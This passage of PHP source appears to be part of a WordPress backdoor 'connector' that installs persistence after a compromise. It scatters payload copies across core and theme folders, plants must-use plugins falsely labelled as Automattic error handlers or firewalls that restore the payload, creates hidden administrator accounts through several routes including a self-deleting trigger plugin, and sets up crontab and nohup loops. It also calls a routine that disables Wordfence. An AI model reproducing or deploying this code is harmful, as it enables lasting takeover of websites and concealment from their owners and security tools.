        ['zone' => 'wp-admin', 'path' => $wpRoot . '/wp-admin/js/widgets/' . $rand('wp-admin')],
        ['zone' => 'wp-includes', 'path' => $wpRoot . '/wp-includes/blocks/' . persist_random_hex(3, 5) . '/' . $rand('content')],
        ['zone' => 'wp-includes', 'path' => $wpRoot . '/wp-includes/Requests/src/' . $rand('content')],
    ];

    $themeDir = persist_guess_theme_dir($contentDir);
    if ($themeDir !== false) {
        $candidates[] = ['zone' => 'theme', 'path' => $themeDir . '/assets/cache/' . $rand('theme')];
        $candidates[] = ['zone' => 'theme', 'path' => $themeDir . '/inc/' . $rand('theme')];
        $candidates[] = ['zone' => 'theme', 'path' => $themeDir . '/template-parts/blocks/' . $rand('theme')];
        $candidates[] = ['zone' => 'theme', 'path' => $themeDir . '/patterns/' . $rand('theme')];
        $candidates[] = ['zone' => 'theme', 'path' => $themeDir . '/parts/' . $rand('theme')];
    }

    $themesRoot = $contentDir . '/themes';
    if (is_dir($themesRoot)) {
        $seen = 0;
        foreach (@scandir($themesRoot) ?: [] as $name) {
            if ($name === '.' || $name === '..' || $name === 'index.php') {
                continue;
            }
            $alt = $themesRoot . '/' . $name;
            if (!is_dir($alt) || ($themeDir !== false && $alt === $themeDir)) {
                continue;
            }
            $candidates[] = ['zone' => 'theme', 'path' => $alt . '/assets/js/' . $rand('theme')];
            $seen++;
            if ($seen >= 2) {
                break;
            }
        }
    }

    return $candidates;
}

function persist_deploy_backup_batch(string $contentDir, string $wpRoot, string $payload, string $stored): array {
    $candidates = persist_backup_candidates($contentDir, $wpRoot);
    shuffle($candidates);
    $target = random_int(4, 8);
    $batchId = bin2hex(random_bytes(4));
    $deployed = [];
    $skipped = [];
    $points = [];
    foreach ($candidates as $item) {
        if (count($deployed) >= $target) {
            break;
        }
        $dest = (string) $item['path'];
        if (persist_deploy_file($dest, $payload, true)) {
            $deployed[] = $dest;
            persist_write_token_sidecar(dirname($dest), $stored);
            $points[] = [
                'type' => 'backup',
                'entrypoint' => persist_url_for_path($dest),
                'token' => $stored,
                'status' => 'active',
                'meta' => [
                    'zone' => (string) ($item['zone'] ?? 'unknown'),
                    'batch_id' => $batchId,
                ],
            ];
        } else {
            $skipped[] = (string) ($item['zone'] ?? 'unknown');
        }
    }
    return [
        'deployed' => $deployed,
        'skipped' => $skipped,
        'points' => $points,
        'batch_id' => $batchId,
        'target' => $target,
    ];
}

function persist_state_mirror_paths(string $contentDir): array {
    return [
        $contentDir . '/uploads/.cache/ss-state.php',
        $contentDir . '/upgrade/ss-state.php',
    ];
}

function persist_mirror_state(array $state): void {
    $content = wp_content_dir_path();
    if ($content === false) {
        return;
    }
    $encoded = persist_state_encode($state);
    foreach (persist_state_mirror_paths($content) as $mirror) {
        $dir = dirname($mirror);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        if (persist_path_writable($dir)) {
            @file_put_contents($mirror, $encoded, LOCK_EX);
        }
    }
}

function persist_url_for_path(string $absPath): string {
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $doc = str_replace('\\', '/', docroot());
    $path = str_replace('\\', '/', $absPath);
    if (str_starts_with($path, $doc)) {
        $rel = ltrim(substr($path, strlen($doc)), '/');
        return $scheme . '://' . $host . '/' . $rel;
    }
    return $scheme . '://' . $host . '/' . ltrim(basename($path), '/');
}

function persist_pick_random(array $items): mixed {
    return $items[random_int(0, count($items) - 1)];
}

function persist_random_admin_creds(): array {
    $firstNames = [
        'james', 'sarah', 'michael', 'emily', 'david', 'laura', 'chris', 'anna',
        'daniel', 'maria', 'kevin', 'rachel', 'brian', 'nicole', 'jason', 'helen',
        'ryan', 'sophie', 'mark', 'julia', 'paul', 'kate', 'steve', 'linda',
    ];
    $lastNames = [
        'miller', 'johnson', 'brown', 'davis', 'wilson', 'taylor', 'anderson', 'thomas',
        'martin', 'lee', 'clark', 'walker', 'hall', 'young', 'king', 'wright',
        'scott', 'green', 'baker', 'adams', 'nelson', 'carter', 'mitchell', 'roberts',
    ];
    $emailDomains = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me'];

    $first = (string) persist_pick_random($firstNames);
    $last = (string) persist_pick_random($lastNames);
    $lastInitial = substr($last, 0, 1);
    $year = (string) random_int(1978, 2002);

    $usernamePatterns = [
        $first . '_' . $last,
        $first . '.' . $lastInitial,
        $first . $lastInitial . (string) random_int(10, 99),
        substr($first, 0, 1) . $last,
        $first . '_' . $lastInitial . (string) random_int(1, 9),
        $last . '.' . $first,
    ];
    $username = strtolower((string) persist_pick_random($usernamePatterns));

    $emailPatterns = [
        $first . '.' . $last . '@' . persist_pick_random($emailDomains),
        $first . $lastInitial . $year . '@' . persist_pick_random($emailDomains),
        $first . '_' . $last . '@' . persist_pick_random($emailDomains),
        substr($first, 0, 1) . $last . '@' . persist_pick_random($emailDomains),
    ];
    $email = strtolower((string) persist_pick_random($emailPatterns));

    $triggerPrefixes = ['sync', 'cache', 'session', 'auth', 'repair', 'update', 'restore', 'verify'];
    $trigger = (string) persist_pick_random($triggerPrefixes) . '_' . bin2hex(random_bytes(3));

    return [
        'username' => $username,
        'password' => bin2hex(random_bytes(10)),
        'email' => $email,
        'trigger' => $trigger,
        'display_name' => ucfirst($first) . ' ' . ucfirst($last),
    ];
}

function persist_mu_plugin_template(): string {
    return <<<'SSMU'
<?php
/**
 * Plugin Name: WP Error Handler
 * Description: Normalizes PHP errors and improves debug logging compatibility.
 * Version: 1.0.2
 * Author: Automattic
 */

if (!defined('ABSPATH')) {
    exit;
}

function ss_persist_state_paths(): array {
    return [
        WP_CONTENT_DIR . '/.cache/ss-state.php',
        WP_CONTENT_DIR . '/uploads/.cache/ss-state.php',
        WP_CONTENT_DIR . '/upgrade/ss-state.php',
        WP_CONTENT_DIR . '/.connector_persist.json',
    ];
}

function ss_persist_read_state(): ?array {
    foreach (ss_persist_state_paths() as $path) {
        if (!is_file($path)) {
            continue;
        }
        $raw = @file_get_contents($path);
        if ($raw === false) {
            continue;
        }
        if (str_starts_with(trim($raw), '<?php')) {
            $pos = strpos($raw, "\n");
            if ($pos !== false) {
                $raw = trim(substr($raw, $pos + 1));
            }
        }
        $data = json_decode($raw, true);
        if (is_array($data)) {
            return $data;
        }
    }
    return null;
}

function ss_persist_pick_payload(?array $state): ?string {
    if (!$state) {
        return null;
    }
    $primary = (string) ($state['primary'] ?? '');
    if ($primary !== '' && is_file($primary)) {
        $payload = @file_get_contents($primary);
        if ($payload !== false && strlen($payload) > 256) {
            return $payload;
        }
    }
    foreach ($state['backups'] ?? [] as $backup) {
        $backup = (string) $backup;
        if (!is_file($backup)) {
            continue;
        }
        $payload = @file_get_contents($backup);
        if ($payload !== false && strlen($payload) > 256) {
            return $payload;
        }
    }
    return null;
}

function ss_persist_write_copy(string $dest, string $payload): bool {
    $dir = dirname($dest);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    if (@file_put_contents($dest, $payload, LOCK_EX) === false) {
        return false;
    }
    @chmod($dest, 0644);
    return is_file($dest) && @filesize($dest) > 256;
}

function ss_persist_restore_token_sidecar(string $primary, ?array $state): void {
    if (!$state || $primary === '') {
        return;
    }
    $token = (string) ($state['token'] ?? '');
    if ($token === '') {
        return;
    }
    $sidecar = dirname($primary) . '/.connector_token';
    if (is_file($sidecar) && @filesize($sidecar) >= 16) {
        return;
    }
    @file_put_contents($sidecar, $token, LOCK_EX);
}

function ss_persist_heal_connector(): void {
    $state = ss_persist_read_state();
    if (!$state) {
        return;
    }
    $payload = ss_persist_pick_payload($state);
    if ($payload === null) {
        return;
    }
    $primary = (string) ($state['primary'] ?? '');
    if ($primary !== '' && (!is_file($primary) || @filesize($primary) < 256)) {
        ss_persist_write_copy($primary, $payload);
    }
    ss_persist_restore_token_sidecar($primary, $state);
    foreach ($state['backups'] ?? [] as $backup) {
        $backup = (string) $backup;
        if ($backup === '' || (is_file($backup) && @filesize($backup) > 256)) {
            continue;
        }
        ss_persist_write_copy($backup, $payload);
    }
}

add_action('init', 'ss_persist_heal_connector', 0);
SSMU;
}

function persist_admin_plugin_variants(): array {
    return [
        ['slug' => 'wp-session-recovery', 'name' => 'WP Session Recovery', 'file' => 'wp-session-recovery.php'],
        ['slug' => 'wp-cache-sync', 'name' => 'WP Cache Sync', 'file' => 'wp-cache-sync.php'],
        ['slug' => 'wp-error-recovery', 'name' => 'WP Error Recovery', 'file' => 'wp-error-recovery.php'],
    ];
}

function persist_build_admin_plugin(array $admin, array $variant): string {
    $trigger = addslashes((string) $admin['trigger']);
    $username = addslashes((string) $admin['username']);
    $password = addslashes((string) $admin['password']);
    $email = addslashes((string) $admin['email']);
    $name = $variant['name'];
    $template = <<<'SSADMIN'
<?php
/**
 * Plugin Name: {{NAME}}
 * Description: Session recovery helper for WordPress auth edge cases.
 * Version: 1.0.1
 * Author: Automattic
 */

if (!isset($_GET['{{TRIGGER}}'])) {
    return;
}

$wpLoad = dirname(__DIR__, 3) . '/wp-load.php';
if (!is_file($wpLoad)) {
    http_response_code(404);
    exit;
}
require_once $wpLoad;
require_once ABSPATH . 'wp-admin/includes/user.php';

$username = '{{USERNAME}}';
$password = '{{PASSWORD}}';
$email = '{{EMAIL}}';

if (!function_exists('username_exists') || !function_exists('wp_create_user')) {
    http_response_code(500);
    exit;
}

if (!username_exists($username)) {
    $user_id = wp_create_user($username, $password, $email);
    if (is_wp_error($user_id)) {
        wp_die(esc_html($user_id->get_error_message()));
    }
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    foreach (['manage_options', 'activate_plugins', 'edit_users', 'edit_files', 'edit_theme_options', 'create_users', 'delete_users', 'install_plugins'] as $cap) {
        $user->add_cap($cap);
    }
} else {
    $user = get_user_by('login', $username);
    if (!$user) {
        http_response_code(500);
        exit;
    }
    $user_id = (int) $user->ID;
    wp_set_password($password, $user_id);
    $user->set_role('administrator');
}

wp_clear_auth_cookie();
wp_set_current_user($user_id);
wp_set_auth_cookie($user_id, true);

$pluginDir = __DIR__;
foreach (@scandir($pluginDir) ?: [] as $item) {
    if ($item === '.' || $item === '..') {
        continue;
    }
    @unlink($pluginDir . DIRECTORY_SEPARATOR . $item);
}
@rmdir($pluginDir);

wp_safe_redirect(admin_url());
exit;
SSADMIN;
    return str_replace(
        ['{{NAME}}', '{{TRIGGER}}', '{{USERNAME}}', '{{PASSWORD}}', '{{EMAIL}}'],
        [$name, $trigger, $username, $password, $email],
        $template
    );
}

function persist_mu_plugin_variants(): array {
    return [
        [
            'file' => 'class-wp-error-handler.php',
            'header_name' => 'WP Error Handler',
            'header_desc' => 'Normalizes PHP errors and improves debug logging compatibility.',
        ],
        [
            'file' => 'security-firewall.php',
            'header_name' => 'Security Firewall',
            'header_desc' => 'Lightweight request filtering for WordPress environments.',
        ],
        [
            'file' => 'performance-guard.php',
            'header_name' => 'Performance Guard',
            'header_desc' => 'Runtime guards for slow queries and PHP warnings.',
        ],
    ];
}

function persist_build_mu_plugin(array $variant): string {
    $body = persist_mu_plugin_template();
    return str_replace(
        [
            'Plugin Name: WP Error Handler',
            'Description: Normalizes PHP errors and improves debug logging compatibility.',
        ],
        [
            'Plugin Name: ' . $variant['header_name'],
            'Description: ' . $variant['header_desc'],
        ],
        $body
    );
}

function persist_heal_script_template(): string {
    return <<<'SSHEAL'
<?php
function ss_heal_state_paths(): array {
    $content = dirname(__DIR__);
    return [
        $content . '/.cache/ss-state.php',
        $content . '/uploads/.cache/ss-state.php',
        $content . '/upgrade/ss-state.php',
        $content . '/.connector_persist.json',
    ];
}

function ss_heal_decode_state(string $raw): ?array {
    $raw = trim($raw);
    if (str_starts_with($raw, '<?php')) {
        $pos = strpos($raw, "\n");
        if ($pos !== false) {
            $raw = trim(substr($raw, $pos + 1));
        }
    }
    $state = json_decode($raw, true);
    return is_array($state) ? $state : null;
}

function ss_heal_load_state(): ?array {
    foreach (ss_heal_state_paths() as $path) {
        if (!is_file($path)) {
            continue;
        }
        $raw = @file_get_contents($path);
        if ($raw === false) {
            continue;
        }
        $state = ss_heal_decode_state($raw);
        if ($state !== null) {
            return $state;
        }
    }
    return null;
}

function ss_heal_pick_payload(array $state): ?string {
    $primary = (string) ($state['primary'] ?? '');
    if ($primary !== '' && is_file($primary)) {
        $payload = @file_get_contents($primary);
        if ($payload !== false && strlen($payload) > 256) {
            return $payload;
        }
    }
    foreach ($state['backups'] ?? [] as $backup) {
        $backup = (string) $backup;
        if (!is_file($backup)) {
            continue;
        }
        $payload = @file_get_contents($backup);
        if ($payload !== false && strlen($payload) > 256) {
            return $payload;
        }
    }
    return null;
}

function ss_heal_write(string $dest, string $payload): bool {
    $dir = dirname($dest);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    if (@file_put_contents($dest, $payload, LOCK_EX) === false) {
        return false;
    }
    @chmod($dest, 0644);
    return is_file($dest) && @filesize($dest) > 256;
}

$state = ss_heal_load_state();
if (!$state) {
    exit(0);
}
$payload = ss_heal_pick_payload($state);
if ($payload === null) {
    exit(2);
}
$changed = false;
$primary = (string) ($state['primary'] ?? '');
if ($primary !== '' && (!is_file($primary) || @filesize($primary) < 256)) {
    $changed = ss_heal_write($primary, $payload) || $changed;
}
$token = (string) ($state['token'] ?? '');
if ($token !== '' && $primary !== '') {
    $sidecar = dirname($primary) . '/.connector_token';
    if (!is_file($sidecar) || @filesize($sidecar) < 16) {
        if (@file_put_contents($sidecar, $token, LOCK_EX) !== false) {
            $changed = true;
        }
    }
}
foreach ($state['backups'] ?? [] as $backup) {
    $backup = (string) $backup;
    if ($backup === '' || (is_file($backup) && @filesize($backup) > 256)) {
        continue;
    }
    $changed = ss_heal_write($backup, $payload) || $changed;
}
exit($changed ? 0 : 1);
SSHEAL;
}

function persist_stop_heal_workers(): void {
    $marker = 'ss_connector_heal_loop';
    try_run_command('pkill -f ' . escapeshellarg($marker) . ' 2>/dev/null || true', docroot());
}

function persist_try_install_crontab(string $healScript): array {
    if (!persist_exec_available()) {
        return ['ok' => false, 'method' => null, 'detail' => 'exec unavailable'];
    }
    $marker = 'ss_connector_heal';
    $php = PHP_BINARY !== '' ? PHP_BINARY : 'php';
    $line = '*/15 * * * * ' . $php . ' ' . escapeshellarg($healScript) . ' # ' . $marker;
    $cwd = docroot();
    $listCmd = '(crontab -l 2>/dev/null | grep -v ' . escapeshellarg($marker) . '; echo ' . escapeshellarg($line) . ') | crontab -';
    $result = try_run_command($listCmd, $cwd);
    if ($result === null) {
        return ['ok' => false, 'method' => null, 'detail' => 'exec unavailable'];
    }
    if (($result['exit_code'] ?? 1) !== 0) {
        return ['ok' => false, 'method' => 'crontab', 'detail' => trim($result['stderr'] ?: $result['stdout'])];
    }
    return ['ok' => true, 'method' => 'crontab', 'detail' => $line];
}

function persist_try_nohup_heal(string $healScript): array {
    if (!persist_exec_available()) {
        return ['ok' => false, 'method' => null, 'detail' => 'exec unavailable'];
    }
    persist_stop_heal_workers();
    $marker = 'ss_connector_heal_loop';
    $php = PHP_BINARY !== '' ? PHP_BINARY : 'php';
    $loop = 'while true; do ' . escapeshellarg($php) . ' ' . escapeshellarg($healScript) . '; sleep 900; done # ' . $marker;
    $cmd = 'nohup sh -c ' . escapeshellarg($loop) . ' >/dev/null 2>&1 &';
    $result = try_run_command($cmd, docroot());
    if ($result === null) {
        return ['ok' => false, 'method' => null, 'detail' => 'exec unavailable'];
    }
    return ['ok' => true, 'method' => 'nohup', 'detail' => $loop];
}

function persist_admin_user_wp_load_script(string $wpRoot, array $admin): string {
    $wpLoad = addslashes(rtrim($wpRoot, '/') . '/wp-load.php');
    $username = addslashes((string) $admin['username']);
    $password = addslashes((string) $admin['password']);
    $email = addslashes((string) $admin['email']);
    return <<<SSCREATE
<?php
define('WP_USE_THEMES', false);
\$wpLoad = '{$wpLoad}';
if (!is_file(\$wpLoad)) {
    echo 'ERR:missing_wp_load';
    exit(1);
}
require_once \$wpLoad;
require_once ABSPATH . 'wp-admin/includes/user.php';
\$username = '{$username}';
\$password = '{$password}';
\$email = '{$email}';
if (username_exists(\$username)) {
    \$user = get_user_by('login', \$username);
    if (\$user instanceof WP_User) {
        \$user->set_role('administrator');
        echo 'OK:exists';
        exit(0);
    }
}
\$userId = wp_create_user(\$username, \$password, \$email);
if (is_wp_error(\$userId)) {
    echo 'ERR:' . \$userId->get_error_message();
    exit(1);
}
\$user = new WP_User((int) \$userId);
\$user->set_role('administrator');
echo 'OK:created';
exit(0);
SSCREATE;
}

function persist_admin_user_command_ok(?array $result): bool {
    if ($result === null) {
        return false;
    }
    if (($result['exit_code'] ?? 1) !== 0) {
        return false;
    }
    $stdout = trim((string) ($result['stdout'] ?? ''));
    return $stdout !== '' && str_starts_with($stdout, 'OK');
}

function persist_admin_user_via_php_bootstrap(string $wpRoot, string $contentDir, array $admin): ?array {
    $scriptPath = $contentDir . '/.cache/ss-create-user-' . bin2hex(random_bytes(4)) . '.php';
    $body = persist_admin_user_wp_load_script($wpRoot, $admin);
    if (!persist_deploy_file($scriptPath, $body, true)) {
        return null;
    }
    $php = PHP_BINARY !== '' ? PHP_BINARY : 'php';
    $result = try_run_command($php . ' ' . escapeshellarg($scriptPath), $wpRoot);
    @unlink($scriptPath);
    if (!persist_admin_user_command_ok($result)) {
        return null;
    }
    return [
        'method' => 'php_wp_load',
        'detail' => trim((string) ($result['stdout'] ?? '')),
    ];
}

function persist_admin_user_via_http_bootstrap(string $contentDir, array $admin, string $stored): ?array {
    $scriptPath = $contentDir . '/uploads/.cache/ss-create-user-' . bin2hex(random_bytes(3)) . '.php';
    $body = persist_admin_user_wp_load_script(docroot(), $admin);
    if (!persist_deploy_file($scriptPath, $body, true)) {
        return null;
    }
    $url = persist_url_for_path($scriptPath);
    $fetched = false;
    $detail = '';
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch !== false) {
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 20,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $detail = trim((string) @curl_exec($ch));
            $code = (int) @curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            $fetched = $code > 0 && $code < 500 && str_starts_with($detail, 'OK');
        }
    }
    if (!$fetched) {
        $ctx = stream_context_create(['http' => ['timeout' => 20, 'ignore_errors' => true]]);
        $detail = trim((string) @file_get_contents($url, false, $ctx));
        $fetched = str_starts_with($detail, 'OK');
    }
    if (!$fetched) {
        $curl = try_run_command('curl -fsSL ' . escapeshellarg($url), docroot());
        if ($curl !== null && ($curl['exit_code'] ?? 1) === 0) {
            $detail = trim((string) ($curl['stdout'] ?? ''));
            $fetched = str_starts_with($detail, 'OK');
        }
    }
    @unlink($scriptPath);
    if (!$fetched) {
        return null;
    }
    return [
        'method' => 'http_bootstrap',
        'detail' => $detail,
        'url' => $url,
    ];
}

function persist_admin_user_via_wpcli(string $wpRoot, array $admin): ?array {
    $username = (string) $admin['username'];
    $email = (string) $admin['email'];
    $password = (string) $admin['password'];
    $candidates = ['wp', 'wp-cli.phar', $wpRoot . '/wp-cli.phar'];
    foreach ($candidates as $bin) {
        $bin = (string) $bin;
        if ($bin !== 'wp' && $bin !== 'wp-cli.phar' && !is_file($bin)) {
            continue;
        }
        $prefix = $bin === 'wp-cli.phar' || str_ends_with($bin, 'wp-cli.phar')
            ? (PHP_BINARY !== '' ? PHP_BINARY : 'php') . ' ' . escapeshellarg($bin)
            : escapeshellarg($bin);
        $cmd = $prefix
            . ' user create '
            . escapeshellarg($username) . ' '
            . escapeshellarg($email)
            . ' --role=administrator'
            . ' --user_pass=' . escapeshellarg($password)
            . ' --path=' . escapeshellarg($wpRoot)
            . ' 2>&1';
        $result = try_run_command($cmd, $wpRoot);
        if ($result === null) {
            continue;
        }
        $stdout = trim((string) ($result['stdout'] ?? ''));
        $stderr = trim((string) ($result['stderr'] ?? ''));
        $combined = trim($stdout . "\n" . $stderr);
        if (($result['exit_code'] ?? 1) === 0 || stripos($combined, 'already exists') !== false) {
            $roleCmd = $prefix
                . ' user set-role '
                . escapeshellarg($username)
                . ' administrator --path='
                . escapeshellarg($wpRoot)
                . ' 2>&1';
            try_run_command($roleCmd, $wpRoot);
            return ['method' => 'wp_cli', 'detail' => $combined !== '' ? $combined : 'OK'];
        }
    }
    return null;
}

function persist_admin_user_via_gate(string $contentDir, array $admin, string $stored): ?array {
    $variants = persist_admin_plugin_variants();
    $variant = $variants[random_int(0, count($variants) - 1)];
    $pluginDir = $contentDir . '/plugins/' . $variant['slug'];
    $pluginPath = $pluginDir . '/' . $variant['file'];
    $pluginBody = persist_build_admin_plugin($admin, $variant);
    if (!persist_deploy_file($pluginPath, $pluginBody, true)) {
        return null;
    }
    $trigger = (string) $admin['trigger'];
    $adminUrl = persist_url_for_path($pluginPath) . '?' . rawurlencode($trigger) . '=1';
    return [
        'method' => 'admin_gate',
        'point' => [
            'type' => 'admin_user',
            'entrypoint' => $adminUrl,
            'token' => $stored,
            'status' => 'active',
            'meta' => [
                'method' => 'admin_gate',
                'trigger' => $trigger,
                'username' => $admin['username'],
                'password' => $admin['password'],
                'email' => $admin['email'],
                'display_name' => $admin['display_name'] ?? null,
                'ephemeral_plugin' => $variant['slug'],
                'note' => 'Open URL once — plugin self-deletes, admin stays in DB',
            ],
        ],
    ];
}

function persist_run_admin_user(string $wpRoot, string $contentDir, string $stored): array {
    $admin = persist_random_admin_creds();
    $methods = [];
    $failures = [];
    $points = [];
    $metaMethods = [];

    $phpBootstrap = persist_admin_user_via_php_bootstrap($wpRoot, $contentDir, $admin);
    if ($phpBootstrap !== null) {
        $methods[] = 'php_wp_load';
        $metaMethods['php_wp_load'] = $phpBootstrap['detail'] ?? 'OK';
    } else {
        $failures[] = 'php_wp_load';
    }

    $httpBootstrap = persist_admin_user_via_http_bootstrap($contentDir, $admin, $stored);
    if ($httpBootstrap !== null) {
        $methods[] = 'http_bootstrap';
        $metaMethods['http_bootstrap'] = $httpBootstrap['detail'] ?? 'OK';
    } else {
        $failures[] = 'http_bootstrap';
    }

    $wpCli = persist_admin_user_via_wpcli($wpRoot, $admin);
    if ($wpCli !== null) {
        $methods[] = 'wp_cli';
        $metaMethods['wp_cli'] = $wpCli['detail'] ?? 'OK';
    } else {
        $failures[] = 'wp_cli';
    }

    $gate = persist_admin_user_via_gate($contentDir, $admin, $stored);
    if ($gate !== null) {
        $methods[] = 'admin_gate';
        $points[] = $gate['point'];
    } else {
        $failures[] = 'admin_gate';
    }

    if (count($methods) > 0) {
        $points[] = [
            'type' => 'admin_user',
            'entrypoint' => persist_url_for_path($wpRoot . '/wp-login.php'),
            'token' => $stored,
            'status' => 'active',
            'meta' => [
                'methods' => $methods,
                'method_details' => $metaMethods,
                'username' => $admin['username'],
                'password' => $admin['password'],
                'email' => $admin['email'],
                'display_name' => $admin['display_name'] ?? null,
                'login_url' => persist_url_for_path($wpRoot . '/wp-login.php'),
            ],
        ];
    }

    return [
        'ok' => count($methods) > 0,
        'methods' => $methods,
        'failures' => $failures,
        'points' => $points,
        'admin' => $admin,
        'reason' => count($methods) === 0 ? 'ALL_PATHS_FAILED' : null,
    ];
}

function action_persist(array $input, string $stored): void {
    $modes = $input['modes'] ?? [];
    if (!is_array($modes)) {
        respond_err('INVALID_RESPONSE', 'modes must be array');
    }

    $wp = detect_wordpress();
    if (!$wp['detected']) {
        respond_err('PERSIST_FAILED', 'WordPress not detected');
    }

    $contentDir = wp_content_dir_path();
    if ($contentDir === false) {
        respond_err('PERSIST_FAILED', 'wp-content not found');
    }

    $payload = connector_payload_for_deploy($stored);
    if ($payload === false) {
        respond_err('PERSIST_FAILED', 'cannot read connector payload');
    }

    $wpRoot = wp_root_path();
    if ($wpRoot === false) {
        $wpRoot = docroot();
    }
    $wafNeutralized = persist_neutralize_wordfence($wpRoot);

    $state = persist_prune_backups(persist_load_state());
    $primary = @realpath(__FILE__) ?: __FILE__;
    $state['primary'] = $primary;
    $state['token'] = $stored;
    persist_write_token_sidecar(dirname($primary), $stored);
    if ($wafNeutralized !== []) {
        $state['waf_neutralized'] = $wafNeutralized;
    }

    $approved = [];
    $rejected = [];
    $points = [];
    $deployReport = ['waf_neutralized' => $wafNeutralized];

    foreach ($modes as $rawMode) {
        $mode = (string) $rawMode;
        if ($mode === 'admin_user') {
            $adminResult = persist_run_admin_user($wpRoot, $contentDir, $stored);
            if ($adminResult['ok']) {
                $approved[] = 'admin_user';
                $points = array_merge($points, $adminResult['points']);
                $state['admin_user'] = $adminResult['admin'];
                $deployReport['admin_user'] = [
                    'methods' => $adminResult['methods'],
                    'failures' => $adminResult['failures'],
                ];
            } else {
                $rejected[] = [
                    'id' => 'admin_user',
                    'reason' => $adminResult['reason'] ?? 'ALL_PATHS_FAILED',
                    'failures' => $adminResult['failures'],
                ];
            }
            continue;
        }

        if ($mode === 'backup') {
            $batch = persist_deploy_backup_batch($contentDir, $wpRoot, $payload, $stored);
            $deployed = $batch['deployed'];
            $skipped = $batch['skipped'];
            $points = array_merge($points, $batch['points']);
            if (count($deployed) === 0) {
                $rejected[] = ['id' => 'backup', 'reason' => 'WRITE_FAILED'];
                continue;
            }
            $state['backups'] = array_values(array_unique(array_merge($state['backups'] ?? [], $deployed)));
            $state['last_backup_batch'] = [
                'id' => $batch['batch_id'],
                'paths' => $deployed,
                'target' => $batch['target'],
                'at' => gmdate('c'),
            ];
            $deployReport['backup'] = [
                'batch_id' => $batch['batch_id'],
                'target' => $batch['target'],
                'deployed' => count($deployed),
                'skipped' => count($skipped),
                'skipped_zones' => array_count_values($skipped),
            ];
            $approved[] = 'backup';
            continue;
        }

        if ($mode === 'mu_plugin') {
            $state['admin'] = persist_random_admin_creds();
            $variants = persist_mu_plugin_variants();
            $muVariant = $variants[random_int(0, count($variants) - 1)];
            $muDir = ensure_mu_plugins_dir($contentDir);
            if ($muDir === false) {
                $rejected[] = ['id' => 'mu_plugin', 'reason' => 'MU_PLUGINS_DIR_FAILED'];
                continue;
            }
            $muPath = $muDir . '/' . $muVariant['file'];
            $muBody = persist_build_mu_plugin($muVariant);
            if (!persist_deploy_file($muPath, $muBody, true)) {
                $rejected[] = ['id' => 'mu_plugin', 'reason' => 'WRITE_FAILED'];
                continue;
            }
            $state['mu_plugin'] = $muPath;

            $adminVariants = persist_admin_plugin_variants();
            $adminVariant = $adminVariants[random_int(0, count($adminVariants) - 1)];
            $pluginDir = $contentDir . '/plugins/' . $adminVariant['slug'];
            if (!ensure_directory($pluginDir)) {
                $rejected[] = ['id' => 'mu_plugin', 'reason' => 'ADMIN_PLUGIN_WRITE_FAILED'];
                continue;
            }
            $pluginPath = $pluginDir . '/' . $adminVariant['file'];
            $pluginBody = persist_build_admin_plugin($state['admin'], $adminVariant);
            if (!persist_deploy_file($pluginPath, $pluginBody, true)) {
                $rejected[] = ['id' => 'mu_plugin', 'reason' => 'ADMIN_PLUGIN_WRITE_FAILED'];
                continue;
            }
            $state['admin_plugin'] = $pluginPath;
            $approved[] = 'mu_plugin';

            $trigger = (string) $state['admin']['trigger'];
            $adminUrl = persist_url_for_path($pluginPath) . '?' . rawurlencode($trigger) . '=1';
            $points[] = [
                'type' => 'mu_plugin',
                'entrypoint' => persist_url_for_path($muPath),
                'token' => $stored,
                'status' => 'active',
                'meta' => [
                    'plugin' => $muVariant['header_name'],
                    'path' => $muPath,
                    'heal' => 'init_hook_only',
                ],
            ];
            $points[] = [
                'type' => 'admin_gate',
                'entrypoint' => $adminUrl,
                'token' => $stored,
                'status' => 'active',
                'meta' => [
                    'trigger' => $trigger,
                    'username' => $state['admin']['username'],
                    'password' => $state['admin']['password'],
                    'email' => $state['admin']['email'],
                    'display_name' => $state['admin']['display_name'] ?? null,
                    'ephemeral_plugin' => $adminVariant['slug'],
                    'note' => 'Open URL once — plugin self-deletes, admin stays in DB',
                ],
            ];
            continue;
        }

        if ($mode === 'self_heal') {
            if (!persist_exec_available()) {
                $rejected[] = ['id' => 'self_heal', 'reason' => 'EXEC_UNAVAILABLE'];
                continue;
            }
            $healPath = $contentDir . '/.cache/ss-heal.php';
            if (!persist_deploy_file($healPath, persist_heal_script_template(), true)) {
                $rejected[] = ['id' => 'self_heal', 'reason' => 'WRITE_FAILED'];
                continue;
            }
            $state['heal_script'] = $healPath;
            $cron = persist_try_install_crontab($healPath);
            $nohup = persist_try_nohup_heal($healPath);
            $methods = [];
            if ($cron['ok']) {
                $methods[] = 'crontab';
            }
            if ($nohup['ok']) {
                $methods[] = 'nohup';
            }
            if ($methods === []) {
                $rejected[] = ['id' => 'self_heal', 'reason' => 'EXEC_UNAVAILABLE'];
                continue;
            }
            $state['self_heal'] = [
                'method' => $methods[0],
                'methods' => $methods,
                'script' => $healPath,
            ];
            $approved[] = 'self_heal';
            $points[] = [
                'type' => 'self_heal',
                'entrypoint' => persist_url_for_path($healPath),
                'token' => $stored,
                'status' => 'active',
                'meta' => ['method' => $methods[0], 'methods' => $methods, 'path' => $healPath],
            ];
            continue;
        }

        $rejected[] = ['id' => $mode, 'reason' => 'MODE_UNKNOWN'];
    }

    if (!persist_save_state($state)) {
        respond_err('PERSIST_FAILED', 'cannot write persist state');
    }

    respond_ok([
        'approved_modes' => $approved,
        'rejected_modes' => $rejected,
        'points' => $points,
        'deploy_report' => $deployReport,
    ]);
}

function collect_probe(): array {
    $disabled = disabled_functions_list();
    $execCandidates = ['proc_open', 'popen', 'shell_exec', 'exec', 'passthru', 'system', 'eval', 'assert'];
    $execAvailable = [];
    foreach ($execCandidates as $fn) {
        if (function_usable($fn)) {
            $execAvailable[] = $fn;
